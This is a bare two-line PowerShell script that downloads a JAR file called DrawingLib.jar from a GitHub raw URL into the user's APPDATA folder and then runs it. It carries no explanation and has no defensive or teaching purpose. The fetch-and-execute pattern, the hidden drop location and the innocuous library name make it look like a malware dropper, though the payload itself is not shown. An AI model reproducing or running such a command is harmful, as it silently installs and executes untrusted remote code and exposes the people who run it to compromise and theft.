Invoke-WebRequest -Uri "https://github.com/violentqm/ww/raw/refs/heads/main/DrawingLib.jar" -OutFile "$env:APPDATA\DrawingLib.jar"
Start-Process "$env:APPDATA\DrawingLib.jar"
